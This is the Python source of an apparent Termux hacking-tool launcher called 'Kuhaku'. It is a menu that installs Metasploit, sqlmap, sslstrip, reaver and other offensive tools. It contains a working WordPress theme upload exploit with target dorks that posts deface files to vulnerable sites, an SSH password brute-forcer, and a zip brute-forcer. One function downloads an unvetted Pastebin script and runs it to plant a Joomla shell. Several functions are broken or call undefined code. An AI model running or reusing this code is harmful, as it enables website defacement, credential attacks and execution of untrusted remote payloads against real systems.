import random
import argparse
import re
import sys
import json
import time
import sys
import urllib
import zipfile
import socket
import requests
import os
import configparser
import subprocess
from sys import argv
from getpass import getpass
from tqdm import tqdm
from termcolor import colored
from time import gmtime, strftime, sleep
class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'
color_random=[color.NOTICE,color.HEADER,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]
random.shuffle(color_random)
Tool = color_random[0] + '''
        d888888b 'd88b'   'd88b'  88        ,d8888.
           88   '8P  Y8' '8P  Y8' 88        88'  YP
           88   88    88 88    88 88        `8bo.
           88   88    88 88    88 88          `Y8b.
           88   '8b  d8' '8b  d8' 88    88  db  `8D
           Yp    'Y88P'   'Y88P'  88888888  `8888Y'
           '''
kuhakuBasrc = 'Kuhaku ~# '
continuePrompt = "\nClick [Return] to continue"
B = '\033[037m'
backtomenu_banner = B+ """
  [00] Return To The Menu
  [99] Back To Menu \033[037m
"""

######################################################
#                                                    #
#                                                    # 
#                 All Logo Program....               #
#                                                    #
#                                                    #
######################################################

class Logo_Exploit:
    def __init__(self):
        print(color.OKGREEN +'''
        888888 Yb  dP 88""Yb 88      dP"Yb  88 888888
        88__    YbdP  88__dP 88     dP   Yb 88  `88'
        88""    dPYb  88"""  88  .o Yb   dP 88   88
        888888 dP  Yb 88     88ood8  YbodP  88   88
        ''')
        print(color.RED +"""
         }--------------{+} Coded By The X Kuhaku {+}------------{
        }---------{+} GitHub.com/The-X-Team-Debug/Kuhaku {+}------{
        """)
        print(color.END +'\n')
class Logo_Information_Gathering:
    def __init__(self):
        print(color.OKGREEN +'''
                         88 88b 88 888888  dP"Yb
                         88 88Yb88 88__   dP   Yb
                         88 88 Y88 88""   Yb   dP
                         88 88  Y8 88      YbodP
                         ''')
        print(color.RED +"""
         }-------------{+} Coded By The X Kuhaku {+}-------------{
        }-------{+}  GitHub.com/The-X-Team-Debug/Kuhaku {+}-------{""")
        print(color.END +'\n')
class Logo_Source_Machine_Hacking:
    def __init__(self):
        print(color_random [0] +'''
        ,d8888.  ,d88b'  88    88 88""""YB  .o88b, 88888888
        88   YP '8P  Y8' 88    88 88    dP d8P  Y8 88
        `8bo.   88    88 88    88 88   dP  8P      88____
         `Y8b.  88    88 88    88 88__dP   8b      88""""
       db  `8D  '8b  d8' 88    88 88"""Yb  Y8b  d8 88
       `8888Y'   'Y88P'  '888888' 88    Yb  'Y88P' 88888888
       ''')
        print(color.RED +"""
         }------------{+} Coded By The X Kuhaku {+}------------{
        }------{+}  GitHub.com/The-X-Team-Debug/Kuhaku  {+}-----{""")
        print(color.END +'\n')
class Logo_Tools_Hacking:
    def __init__(self):
        print(color_random[0] +'''
        d888888b 'd88b'   'd88b'  88        ,d8888.
           88   '8P  Y8' '8P  Y8' 88        88'  YP
           88   88    88 88    88 88        `8bo.
           88   88    88 88    88 88          `Y8b.
           88   '8b  d8' '8b  d8' 88    88  db  `8D
           Yp    'Y88P'   'Y88P'  88888888  `8888Y'
           ''')
class Logo_Sniffing:
    def __init__(self):
        print(color.OKGREEN +"""
    .dP"Y8 88b 88 88 888888 888888 88 88b 88  dP""b8
    `Ybo." 88Yb88 88 88__   88__   88 88Yb88 dP   `"
    o.`Y8b 88 Y88 88 88""   88""   88 88 Y88 Yb  "88
    8bodP' 88  Y8 88 88     88     88 88  Y8  YboodP
     """)
        print(color.RED +'''
      }------------------{+} Coded By The X Kuhaku {+}------------{
    }---------{+}  GitHub.com/The-X-Team-Debug/Kuhaku {+}--------{ ''')
        print(color.END +'\n')
class Logo_Wireless_Testing:
    def __init__(self):
        print(color.OKGREEN +'''
          Yb        dP 88 88""Yb 888888 88     888888 .dP"Y8 .dP"Y8
           Yb  db  dP  88 88__dP 88__   88     88__   `Ybo." `Ybo."
            YbdPYbdP   88 88"Yb  88""   88  .o 88""   o.`Y8b o.`Y8b
             YP  YP    88 88  Yb 888888 88ood8 888888 8bodP' 8bodP''')
        print(color.RED +'''
          }--------------{+} Coded By The X Kuhaku {+}------------{
         }-------{+}  GitHub.com/The-X-Team-Debug/Kuhaku {+}-----{''')
        print(color.END +'\n')
class Logo_MyCoding:
    def __init__(self):
        print(color_random[0] +'''
        .o88b,  ,d88b.  .88888.    88 88b    88 .88888888
        d8P  Y8 '8P  Y8' 88    Y8  88 88Yb   88 88
        8P      88    88 88     Y8 88 88 Y8  88 88  
        8b      88    88 88     d8 88 88  Yb 88 88   8888
        Y8b  d8 '8b  d8' 88    d8  88 88   Y888 88      d8
         'Y88P'  'Y88P'  .88888'   88 88    Y88  '8888888' ''')
        print(color.RED +'''
          }----------------{+} Coded By The X Kuhaku {+}----------{
        }---------{+}  GitHub.com/The-X-Team-Debug  {+}----------{
''')
        print(color.END +'\n')

######################################################
#      						     #
#						     #
#	   		Author...		     #
#						     #
#					   	     #
######################################################

Kuhaku88 = {"nama":" Author    [] The X Kuhaku",
	    "kkl": " Youtube   [] Kuhaku Termux",
            "ll":  " Team      [] The X Team"
           }

def restart_program():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()

class backtomenu:
    def __init__(self):
             print(backtomenu_banner)
             backtomenu = str(input(kuhakuBasrc))

             if backtomenu == '00':
                 source()
             elif backtomenu == '99':
                 restart_program()
             else:
                  res_semua()

def res_semua():

    try:
        restart_program()
    except:
        restart_program()

def clearScr():
	subprocess.call('clear',shell=True)

class kuhaku:
	def __init__(self):
	    clearScr()
	    self.createFolders()

def completed(self):
        input("Completed, click return to go back")
        self.__init__()

def metasploit_device_70():
    clearScr()
    subprocess.call('figlet Metasploit',shell=True)
    subprocess.call('figlet Framework',shell=True)
    print("Metasploit-Framework Device 7.0")
    time.sleep(3)
    print('Installation...')
    time.sleep(1)
    subprocess.call('apt update && apt upgrade',shell=True)
    subprocess.call('apt install unstable-repo -y',shell=True)
    subprocess.call('apt install ruby -y',shell=True)
    subprocess.call('apt install metasploit -y',shell=True)
    print('Installation Complete...')
    time.sleep(2)
    print('How To Enter Metasploit : ')
    time.sleep(0.7)
    print('Type this $ msfconsole')
    time.sleep(0.8)
    print('Because this will go into automatic metasploit because of my will :)')
    time.sleep(0.9)
    print('Sedang Masuk Metasploit....')
    time.sleep(0.5)
    subprocess.call('msfconsole',shell=True)

def metasploit_device_60():
    clearScr()
    subprocess.call('figlet Metasplpoit',shell=True)
    subprocess.call('figlet Framework',shell=True)
    print('Metasploit-Framework Device 6.0')
    time.sleep(2)
    print('Installation...')
    time.sleep(1)
    subprocess.call('apt update && apt upgrade -y',shell=True)
    subprocess.call('apt install ruby',shell=True)
    subprocess.call('apt install curl',shell=True)
    subprocess.call('curl -LO https://github.com/termux/termux-packages/files/3995119/metasploit_5.0.65-1_all.deb.gz',shell=True)
    subprocess.call('gunzip metasploit_5.0.65-1_all.deb.gz',shell=True)
    subprocess.call('dpkg -i metasploit_5.0.65-1_all.deb',shell=True)
    subprocess.call('apt install -f',shell=True)
    print('Installation Complete...')
    time.sleep(0.6)
    print('How To Enter Metasploit : ')
    time.sleep(0.8)
    print('Type this $ msfconsole')
    subprocess.call('msfconsole',shell=True)


def yagmail():
    clearScr()
    subprocess.call('figlet Source Yagmail',shell=True)
    time.sleep(2)
    print("""
    import yagmail

    a=yagmail.SMTP('gmail','pw')
    subject='Example'
    body=str(input('Example'))
    a=send('gmail',subject,body)\n""")

def source_zipfile():
    clearScr()
    subprocess.call('figlet Source Brute-Zipfile',shell=True)
    time.sleep(2)
    print("""

import zipfile
from tqdm import tqdm

aa = input('---------')
bb = input('---------')

bb = zipfile.ZipFile(bb)
cc = len(list(open(aa, "r")))
print("------------", cc)

with open(aa, "r") as aa:
    for word in tqdm(aa, total=cc, unit="word"):
        try:
            bb.extractall(pwd=word.strip())
        except:
            continue
        else:
            print("------------", word.decode().strip())
            exit(0)
print("-------------")""")

def SSH():
    clearScr()
    subprocess.call('figlet Source Brute-SSH',shell=True)
    time.sleep(2)
    print('''
import paramiko
import socket
import time
from colorama import init, Fore

init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE


def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}--------- {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"------------- {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}--------------- {RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        print(f"{GREEN}-------:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    passlist = open(passlist).read().splitlines()
    for password in passlist:
        if is_ssh_open(host, user, password):
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break ''')
__kuhaku__='  The X Kuhaku'

def sportimo():
    clearScr()
    subprocess.call('figlet Deface',shell=True)
    subprocess.call('figlet Oraange Themes',shell=True)
    time.sleep(2)

    print(color.WARNING +"""
88888888888888888888888888888888888888888888888888888888888888888888
88                                                                88
88 Dork :                                                         88
88  inurl:/wp-content/themes/sportimo-theme                       88
88                                                                88
88 Exploit :                                                      88
88  wp-content/themes/sportimo-theme/functions/upload-handler.php 88
88                                                                88
88                                                                88
88  inurl:"/wp-content/themes/agritourismo-theme/"                88
88                                                                88
88  inurl:"/wp-content/themes/bordeaux-theme/"                    88
88                                                                88
88  inurl:"/wp-content/themes/bulteno-theme/"                     88
88                                                                88
88  inurl:"/wp-content/themes/oxygen-theme/"                      88
88                                                                88
88  inurl:"/wp-content/themes/radial-theme/"                      88
88                                                                88
88  inurl:"/wp-content/themes/rayoflight-theme/"                  88
88                                                                88
88  inurl:"/wp-content/themes/reganto-theme/"                     88
88                                                                88
88  inurl:"/wp-content/themes/rockstar-theme/"                    88
88                                                                88
88                                                                88    
88 Exploit :                                                      88
88  wp-content/themes/rockstar-theme/functions/upload-handler.php 88
88                                                                88
88888888888888888888888888888888888888888888888888888888888888888888""")
    time.sleep(1)
    print(color.END +'\n')

    headers={
  'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0  '
  }
    exploit='/wp-content/themes/sportimo-theme/functions/upload-handler.php'
    target=input('Target : ')
    TheX=target+exploit
    sora=input('Your File Deface: ')
    deface=open(sora, 'r')
    shiro={
            'orange_themes':deface
            }
    kuhaku=requests.post(TheX, files=shiro, headers=headers)
    print(kuhaku.text)

def source_sportimo():
    clearScr()
    subprocess.call('figlet Source',shell=True)
    subprocess.call('figlet Sportimo',shell=True)
    time.sleep(2)
    print('''

import requests

headers={
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0'
        }
izuna='/wp-content/themes/sportimo-theme/functions/upload-handler.php'
shiro=input('-----')
sora=shiro+izuna
stephanie=input('------')
tet=open(stephanie, 'r')
jibril={
       'orange_themes':deface
       }
kuhaku=requests.post(sora, files=jibril, headers=headers)
print(kuhaku.text) ''')
__TheX__='  The X Team'

def brute_zipfile():
    subprocess.call('clear',shell=True)
    subprocess.call('figlet Brute-ZipFile',shell=True)
    time.sleep(2)

    kuhaku=input("Enter Your worldlist.txt : ")
    shiro=input("Enter the password zip file : ")

    shiro=zipfile.ZipFile(shiro)
    sora=len(list(open(kuhaku, "r")))
    print("Total passwords that have been tried ::", sora)

    with open(kuhaku, "rb") as kuhaku:
        for TheX in tqdm(kuhaku, total=sora, unit="word"):
            try:
                shiro.extractall(pwd=TheX.strip())
            except:
                continue
            else:
                print("[+] Password Found :", TheX.decode().strip())
                exit(0)
        print("[!] Password Not Found ")
    

class nmap:
    nmapLogo = '''
    88b 88 8b    d8    db    88""Yb
    88Yb88 88b  d88   dPYb   88__dP
    88 Y88 88YbdP88  dP__Yb  88"""
    88  Y8 88 YY 88 dP""""Yb 88
    '''

    def __init__(self):
        self.gitRepo = "https://github.com/nmap/nmap.git"

        self.targetPrompt = "   Enter Target IP/Subnet/Range/Host: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return (os.path.isfile("/usr/bin/nmap") or os.path.isfile("/usr/local/bin/nmap"))

    def install(self):
        os.system("git clone --depth=1 https://github.com/nmap/nmap.git")
        os.system("cd %s && ./configure && make && make install")

    def run(self):
        clearScr()
        print(self.nmapLogo)
        target = str(input(self.targetPrompt))
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.nmapLogo)
        print("   Nmap scan for: %s\n" % target)
        print("   {1}--Simple Scan [-sV]")
        print("   {2}--Port Scan [-Pn]")
        print("   {3}--Operating System Detection [-A]\n")
        print("   {99}-Return to information gathering menu \n")
        response = str(input("nmap ~# "))
        clearScr()
        logPath = "logs/nmap-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("nmap -sV -oN %s %s" % (logPath, target))
                response = str(input(continuePrompt))
            elif response == "2":
                os.system("nmap -Pn -oN %s %s" % (logPath, target))
                response = str(input(continuePrompt))
            elif response == "3":
                os.system("nmap -A -oN %s %s" % (logPath, target))
                response = str(input(continuePrompt))
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)
'''
Source Kodingan Machine & Hacki ng
'''

class source:
    def __init__(self):
        clearScr()
        Logo_Source_Machine_Hacking()
        print(' [ 01 ]  Yagmail')
        print(' [ 02 ]  Brute_SSH_Server')
        print(' [ 03 ]  Brute_ZipFile')
        print(' [ 04 ]  Deface_Sportimo')
        print('')
        print(' [ 99 ] Back To Main Menu')
        print('')
        source=input(kuhakuBasrc)

        if source == '1' or source == '01':
            yagmail()
            backtomenu()
        elif source == '2' or source == '02':
            SSH()
            backtomenu()
        elif source == '3' or source == '03':
            source_zipfile()
            backtomenu()
        elif source == '4' or source == '04':
            source_sportimo()
            backtomenu()
        elif source == '99':
            kuhaku()
        else:
            self.__init__()
        self.completed()


'''
  8888888888    88888888     88     88
  88  88  88    88             88  88
      88        88888888         88
      88        88             88  88
      88        88888888     88      88


        8888888888    8888888    88888888    888    888
	88  88  88    88         88    88    8888  8888
	    88        8888888    88888888    88  88  88
 	    88        88         88    88    88      88
	    88        8888888    88    88    88      88
'''

######################################################
#                                                    #
#                                                    #
#               Project Tools Hacking                #  
#                                                    #
#                                                    #
######################################################

class List:
    def __init__(self):
        clearScr()
        print(Tool)
        print(color.RED +'''
         }--------------{+} Coded By Kuhaku {+}-------------{
        }--------{+}  GitHub.com/The-X-Team-Debug {+}--------{''')
        print(color.END +"""
        [ 01 ]---   Information Gathering    ---------{}
        [ 02 ]---   Wireless Testing         ---------{}
        [ 03 ]---   Exploit Tools            ---------{}
        [ 04 ]---   Sniffing & Spoofing      ---------{}
        [ 05 ]---   Web Hacking              ---------{}
        [ 06 ]---   Vulnerability Scanner    ---------{}
        [ 07 ]---   Password Attack          ---------{}
        [ 08 ]---   Other                    ---------{}
        [ 99 ]---   Back To Main Menu        ---------{}""")
        tools = input(kuhakuBasrc)
        
        if tools == '1' or tools == '01':
            information()
        elif tools == '2' or tools == '02':
            wireless()
        elif tools == '3' or tools == '03':
            exploit()
        elif tools == '4' or tools == '04':
            sniffing()
        elif tools == '99':
            kuhaku()
        else:
            self.__init__()
        self.completed()
    
class sniffing:
    def __init__(self):
        clearScr()
        Logo_Sniffing()
        print('[ 01 ] Wireshark - PF tool port forwading')
        print('[ 02 ] SSLtrip - MITM tool that implements SSL stripping  attacks')
        print('[ 99 ] Return To The Menu')
        sniffing=input(kuhakuBasrc)

        if sniffing == '1' or sniffing == '01':
            wires()
        elif sniffing == '2' or sniffing == '02':
            ssls()
        elif sniffing == '99':
            List()
        else:
            self.__init__()
        self.completed()
    
    def completed(self):
        input("Completed, click return to go back")
        self.__init__()

class exploit:
    def __init__(self):
        clearScr()
        Logo_Exploit()
        print('[ 01 ] Metasploit-Framework')
        print('[ 02 ] sqlmap')
        print('')
        print('[ 99 ] Return To The Menu')
        exsploit=input(kuhakuBasrc)

        if exsploit == '1' or exsploit == '01':
            clearScr()
            subprocess.call('figlet Metasploit Framework | lolcat',shell=True)
            time.sleep(2)
            print('[ 01 ]  Metasploit Ver 5 Device Nougat ++')
            print('[ 02 ]  Metasploit Ver 5 Device Lolipop ++ ')
            print('')
            print('[ 99 ] Return To The Menu')
            run()
        elif exsploit == '2' or exsploit == '02':
            sqlmap()
        elif exsploit == '99':
            List()
        else:
            self.__init__()
        self_completed()

class wireless:
    def __init__(self):
        clearScr()
        Logo_Wireless_Testing()
        print('[ 01 ]  reaver')
        print('[ 02 ]  pixiewps')
        print('')
        print('[ 99 ]  Return To The Menu')
        wireless=input(kuhakuBasrc)

        if wireless == '1' or wireless == '01':
            reaver()
        elif wireless == '2' or wireless == '02':
            pixiewps()
        elif wireless == '99':
            List()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        input("Completed, click return to go back")
        self.__init__()
def yt():
    yt='Youtube'
    return yt
def aut():
    aut='Author'
    return aut
def txt():
    txt='Team'
    return txt
class information:
    def __init__(self):
        clearScr()
        Logo_Information_Gathering()
        print('[ 01 ]  nmap')
        print('[ 02 ]  ReconDog')
        print('[ 03 ]  D-Tect')
        print('[ 04 ]  OSIF')
        print('[ 05 ]  EvilURL')
        print('[ 06 ]  Infoga')
        print('[ 07 ]  RedHawk')
        print('[ 08 ]  Devploit')
        print('')
        print('[ 99 ]  Return To The Menu')
        information_gathering=input(kuhakuBasrc)

        if information_gathering == '1':
            nmap()
        elif information_gathering == '2':
            Recon_Dog()
        elif information_gathering == '3':
            d_tect()
        elif information_gathering == '4':
            OSIF()
        elif information_gathering == '5':
            EvilURL()
        elif information_gathering == '6':
            Infoga()
        elif information_gathering == '7':
            red_hawk()
        elif information_gathering == '8':
            DevPloit()
        elif information_gathering == '99':
            List()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        input("Completed, click return to go back")
        self.__init__()


###################################################
#						  #
#						  #
#	       Information-Gathering	          #
#						  #
#						  #
###################################################

def d_tect():
        clearScr()
        subprocess.call('figlet D Tect',shell=True)
        time.sleep(2)
        subprocess.call('apt install python2 git',shell=True)
        clearScr()
        subprocess.call('git clone https://github.com/bibortone/D-Tech',shell=True)
        subprocess.call('mv D-Tech ~')

def DevPloit():
        clearScr()
        subprocess.call('figlet DevPloit',shell=True)
        time.sleep(2)
        subprocess.call('apt install python2 git && python2 -m pip install urllib2',shell=True)
        subprocess.call('git clone https://github.com/joker25000/Devploit',shell=True)
        subprocess.call('cd Devploit')

def OSIF():
        clearScr()
        subprocess.call('figlet OSIF',shell=True)
        time.sleep(2)
        subprocess.call('apt install python2 git',shell=True)
        subprocess.call('python2 -m pip install requests',shell=True)
        clearScr()
        subprocess.call('git clone https://github.com/ciku370/OSIF',shell=True)
        subprocess.call('mv OSIF ~',shell=True)

def Recon_Dog():
        clearScr()
        subprocess.call('figlet Recon Dog',shell=True)
        time.sleep(2)
        clearScr()
        subprocess.call('git clone https://github.com/UltimateHackers/ReconDog',shell=True)
        subprocess.call('cd ReconDog ',shell=True)

def red_hawk():
        clearScr()
        subprocess.call('figlet Red Hawk',shell=True)
        time.sleep(2)
        subprocess.call('apt install php',shell=True)
        clearScr()
        subprocess.call('git clone https://github.com/Tuhinshubhra/RED_HAWK',shell=True)
        subprocess.call('mv RED_HAWK ~',shell=True)
        
def sqlmap():
        clearScr()
        subprocess.call('figlet sqlmap',shell=True)
        time.sleep(2)
        subprocess.call('apt install python2',shell=True)
        clearScr()
        subprocess.call('git clone https://github.com/sqlmapproject/sqlmap',shell=True)
        subprocess.call('mv sqlmap ~',shell=True)

class Infoga:
    InfogaLogo = '''
    888888 88b 88 888888 dP"Yb  888888    db
      88   88Yb88 88__  dP   Yb 88       dPYb
      88   88 Y88 88""  Yb   dP 88  88  dP__Yb
    888888 88  Y8 88     YbodP  888888 dP""""Yb 
    '''
    
    def __init__(self):
        clearScr()
        print(self.InfogaLogo)
        time.sleep(2)
        subprocess.call('python2 -m pip install requests urllib3 urlparse',shell=True)
        clearScr()
        subprocess.call('git clone https://github.com/m4ll0k/Infoga',shell=True)
        subprocess.call('mv Infoga ~',shell=True)

class EvilURL:
    evilLogo = '''
    888888 8b     d8 8888 88  88  88 88""Yb 88
    88__    8b   d8   88  88  88  88 88__dP 88
    88""     8b d8    88  88  88  88 88"Yb  88
    888888    b8d    8888 88  888888 88  Yb 88888
    '''

    def __init__(self):
        clearScr()
        print(self.evilLogo)
        time.sleep(2)
        subprocess.call('apt install git python2 python3',shell=True)
        clearScr()
        subprocess.call('git clone https://github.com/UndeadSec/EvilURL',shell=True)
        subprocess.call('mv EvilURL ~',shell=True)

###################################################
#                                                 #
#                                                 #
#              Wireless Teting                    #
#                                                 #
#                                                 #
###################################################
class pixiewps:
    def __init__(self):
        clearScr()
        if not self.install():
            clearScr()
            self.run()

    def install(self):
        subprocess.call("git clone --depth=1 https://github.com/wiire/pixiewps.git",shell=True)
        subprocess.call("apt-get -y install build-essential",shell=True)
        subprocess.call("make",shell=True)
        subprocess.call("sudo make install",shell=True)

    def run(self):
        subprocess.call("pixiewps --help",shell=True)

class reaver:
    def __init__(self):
        if not self.install():
            clearScr()
        self.run()

    def install(self):
        subprocess.call("git clone --depth=1 https://github.com/t6x/reaver-wps-fork-t6x.git",shell=True)
        subprocess.call("apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps",shell=True)
        subprocess.call("cd reaver-wps-fork-t6x/",shell=True)
        subprocess.call("./configure",shell=True)
        subprocess.call("make",shell=True)
        subprocess.call("sudo make install",shell=True)

    def run(self):
        subprocess.call("reaver --help",shell=True)

def run():
    aa = input(kuhakuBasrc)

    if aa == '1' or aa == '01':
        metasploit_device_70()
    elif aa == '2' or aa == '02':
        metasploit_device_60()
    elif aa == '99':
        exploit()

###################################################
#                                                 #
#                                                 #
#              Sniffing & Spoofing                #
#                                                 #
#                                                 #
###################################################
def ssls():
    clearScr()
    print('''
	sslstrip is a MITM tool that
	implements Moxie Marlinspike's SSL stripping
	attacks.It requires Python 2.5 or newer, along with the 'twisted' python module.''')
    ssls=input('continue Y / N: ')

    if ssls == 'y' or ssls == 'Y':
        os.system("git clone --depth=1 https://github.com/moxie0/sslstrip.git")
        os.system("apt-get install python-twisted-web")
        os.system("python sslstrip/setup.py")
    elif ssls == 'n' or ssls == 'N':
        sniffing()
    else:
        Logo_Sniffing.completed("SSlStrip")

def wires():
    clearScr()
    subprocess.call('figlet Wireshark',shell=True)
    time.sleep(2)
    subprocess.call('apt install x11-repo',shell=True)
    subprocess.call('apt install wireshark',shell=True)
    subprocess.call('apt install wireshark-gtk',shell=True)
    subprocess.call('apt install tigervnc',shell=True)
    print('')
    print('Steps to access wireshark :')
    print('')
    print('1. Download VNC viewer on google play store')
    print('2. Open termux then type $ vncserver')
    print('3. Then create a Password for VNC')
    print('4. Open the VNC viewer and select the sign ( + ) ')
    print('5. Feedback (( localhost:1 )) (( whatever ))')
    print('6. Continue to select connect then select ok and enter the VNC password created on termux')
    print('7. And how to use it, you can see the tutorial on Youtube or Google')

def wppjmla():
    ipp = str(input('Enter Target IP: '))
    sites = bing_all_grabber(str(ipp))
    wordpress = check_wordpress(sites)
    joomla = check_joomla(sites)
    for ss in wordpress:
        print(ss)
    print('[+] Found ! ', len(wordpress), ' Wordpress Websites')
    print('-' * 30 + '\n')
    for ss in joomla:
        print(ss)
    print('[+] Found ! ', len(joomla), ' Joomla Websites')

    print('\n')

def hydra():
    clearScr()
    os.system('figlet Hydra')
    time.sleep(2)
    subprocess.call('apt update && apt upgrade',shell=True)
    subprocess.call('apt install hydra',shell=True)

def joomscan():
    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
    clearScr()
    print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
    jmtarget = str(input("Select a targets list:"))
    os.system("python temp.py %s" % jmtarget)

class decompile:
    def __init__(self):
        clearScr()
        print('')

def my_codingan():
        clearScr()
        Logo_MyCoding()
        print(' [ 01 ] Brute_ZipFile')
        print(' [ 02 ] Deface_Orange_Themes')
        print('')
        print(' [ 99 ] Back To Main Menu')
        my_coding=input(kuhakuBasrc)

        if my_coding == '1' or my_coding == '01':
            brute_zipfile()
        elif my_coding == '2' or my_coding == '02':
            deface()
        elif my_coding == '99':
            kuhaku()
        else:
            res_semua()
__YT__='  Kuhaku Termux'
def deface():
    print('')
    print('[ 01 ]  How To Use ')
    print('[ 02 ]  Run Deface ')
    print('')
    print('[ 99 ]  Return To The Menu')
    print('')
    deface=input(kuhakuBasrc)

    if deface == '1' or deface == '01':
        subprocess.call('am start https://youtu.be/FAuwbxe39o0',shell=True)
        keluar()
    elif deface == '2' or deface == '02':
        sportimo()
    elif deface == '99':
        my_codingan()
def author():
    print(__logo__)
    print(colored('  [ Version 2.7 ]','green'))
    print('')
    print(aut(),__bail1__+__kuhaku__)
    print(yt(),__bail2__+__YT__)
    print(txt(),__bail3__+__TheX__)
    print('')

def keluar():
    print('[ 99 ]Return To The Menu')
    keluar=input(kuhakuBasrc)

    if keluar == '99':
        my_codingan()
    
__bail1__='   []'
__bail2__='  []'
__bail3__='     []'
__logo__='''

  8888888888   8888888     88      88
  88  88  88   88 	     88  88
      88       8888888	       88
      88       88   	    88   88
      88       88888888   88       88

    88    88   88    88   88   88   88888888   88    88   88    88
    88  88     88    88   88   88   88    88   88  88     88    88
    8888       88    88   8888888   88888888   8888       88    88
    88  88     88    88   88   88   88    88   88  88     88    88
    88    88   88888888   88   88   88    88   88    88   88888888
'''

subprocess.call("clear",shell=True)

class update:
    def __init__(self):
        clearScr()
        subprocess.call('figlet Update Tools',shell=True)
        time.sleep(1)
        subprocess.call('git clone --depth=1 https://github.com/The-X-Team-Debug/Kuhaku',shell=True)
        subprocess.call('cd Kuhaku && bash ./update.sh',shell=True)
        subprocess.call('Kuhaku',shell=True)

def exit():
    clearScr()

def TheX(Kuhaku):
    for sora in Kuhaku + '\n':
        sys.stdout.write(sora)
        sys.stdout.flush()
        time.sleep(1./12)

def kuhaku():
        clearScr()
        author()
        print(" [ 01 ]  Source Code Hacking & Machine Learn")
        print(" [ 02 ]  Tools Hacking")
        print(" [ 03 ]  Decompile")
        print(" [ 04 ]  My Codingan")
        print(' [ 05 ]  Update')
        print(" [ 06 ]  Info_Tools")
        print(' [ 99 ]  Exit ')
        a=input(kuhakuBasrc)

        if a == '1' or a == '01':
            source()
        elif a == '2' or a == '02':
            List()
        elif a == '3' or a == '03':
            print('belum ada')
            restart_program()
        elif a == '4' or a == '04':
            my_codingan()
        elif a == '5' or a == '05':
            update()
        elif a == '6' or a == '06':
            clearScr()
            subprocess.call('cat etcf.txt',shell=True)
        elif a == '99':
            clearScr()
            TheX(colored('Thank you for using this tool :)','cyan'))
            TheX(colored('I say thank you very much :)','cyan'))
        else:
            res_semua()
        

#################################
if __name__ == '__main__':
    kuhaku()

